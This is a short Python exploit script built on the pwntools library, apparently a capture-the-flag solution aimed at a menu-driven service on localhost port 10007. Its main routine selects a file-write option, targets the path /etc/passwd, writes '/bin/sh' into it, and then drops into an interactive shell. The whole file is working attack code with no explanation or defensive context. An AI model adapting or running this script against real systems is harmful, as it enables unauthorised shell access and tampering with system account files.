from pwn import *

local=0
pc=''
aslr=True
context.log_level="debug"
context.terminal = ["deepin-terminal","-x","sh","-c"]

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

if local==1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
    gdb.attach(p)
else:
    remote_addr=['127.0.0.1', 10007]
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s):
    print('\033[1;31;40m{s}\033[0m'.format(s=s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    ru("sock num > ")
    sn(str(sys.argv[1]))
    ru("Exit\n")
    pause()
    sl("2")
    ru("size > ")
    sl("256")
    ru("path > ")
    sn("/etc/passwd")
    ru("content: \n")
    sn("/bin/sh\x00")
    p.interactive()

